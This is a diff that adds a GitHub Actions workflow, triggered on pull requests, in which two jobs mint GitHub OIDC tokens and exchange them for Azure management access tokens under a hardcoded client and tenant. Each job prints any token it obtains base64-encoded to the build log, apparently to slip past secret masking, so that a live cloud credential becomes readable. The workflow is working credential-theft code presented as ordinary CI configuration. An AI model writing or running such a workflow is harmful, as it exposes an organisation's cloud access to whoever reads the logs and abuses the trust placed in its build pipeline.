@@ -1,0 +1,73 @@
+name: c211-77sm-pr-oidc
+on:
+  pull_request:
+    types: [opened, synchronize]
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  pr_env_copilot:
+    name: pr-env-copilot
+    runs-on: ubuntu-latest
+    environment: copilot
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - name: exchange
+        shell: bash
+        run: |
+          python3 - <<'PY'
+          import json, os, base64, urllib.request, urllib.parse, urllib.error
+          AUDS = ["api://AzureADTokenExchange","https://management.azure.com/"]
+          def mint(aud):
+              u = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + ("&" if "?" in os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] else "?") + "audience=" + urllib.parse.quote(aud)
+              r = urllib.request.Request(u, headers={"Authorization": "bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
+              return json.load(urllib.request.urlopen(r, timeout=30))["value"]
+          for aud in AUDS:
+              tok = mint(aud)
+              p = tok.split(".")[1]; p += "=" * (-len(p) % 4)
+              claims = json.loads(base64.urlsafe_b64decode(p))
+              body = urllib.parse.urlencode({"client_id":"c3443edf-23aa-4b6b-b1cf-d0c59c1d8a02","scope":"https://management.azure.com/.default","grant_type":"client_credentials","client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":tok}).encode()
+              req = urllib.request.Request("https://login.microsoftonline.com/a4aa23fd-b9db-4725-b9e3-dc27ca75c86c/oauth2/v2.0/token", data=body, headers={"Content-Type":"application/x-www-form-urlencoded"})
+              try:
+                  resp = urllib.request.urlopen(req, timeout=60); txt = resp.read().decode(); code = resp.status
+              except urllib.error.HTTPError as e:
+                  txt = e.read().decode(); code = e.code
+              j = json.loads(txt)
+              print("AUD", aud, "| SUB", claims.get("sub"), "| AAD_HTTP", code, "| ERR", j.get("error"), str(j.get("error_description"))[:200])
+              if "access_token" in j:
+                  print("AAD_TOKEN_B64", base64.b64encode(j["access_token"].encode()).decode())
+          PY
+
+  pr_plain:
+    name: pr-plain
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - name: exchange
+        shell: bash
+        run: |
+          python3 - <<'PY'
+          import json, os, base64, urllib.request, urllib.parse, urllib.error
+          u = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + ("&" if "?" in os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] else "?") + "audience=" + urllib.parse.quote("api://AzureADTokenExchange")
+          r = urllib.request.Request(u, headers={"Authorization": "bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
+          tok = json.load(urllib.request.urlopen(r, timeout=30))["value"]
+          p = tok.split(".")[1]; p += "=" * (-len(p) % 4)
+          claims = json.loads(base64.urlsafe_b64decode(p))
+          body = urllib.parse.urlencode({"client_id":"c3443edf-23aa-4b6b-b1cf-d0c59c1d8a02","scope":"https://management.azure.com/.default","grant_type":"client_credentials","client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":tok}).encode()
+          req = urllib.request.Request("https://login.microsoftonline.com/a4aa23fd-b9db-4725-b9e3-dc27ca75c86c/oauth2/v2.0/token", data=body, headers={"Content-Type":"application/x-www-form-urlencoded"})
+          try:
+              resp = urllib.request.urlopen(req, timeout=60); txt = resp.read().decode(); code = resp.status
+          except urllib.error.HTTPError as e:
+              txt = e.read().decode(); code = e.code
+          j = json.loads(txt)
+          print("AUD api://AzureADTokenExchange | SUB", claims.get("sub"), "| AAD_HTTP", code, "| ERR", j.get("error"), str(j.get("error_description"))[:200])
+          if "access_token" in j:
+              print("AAD_TOKEN_B64", base64.b64encode(j["access_token"].encode()).decode())
+          PY
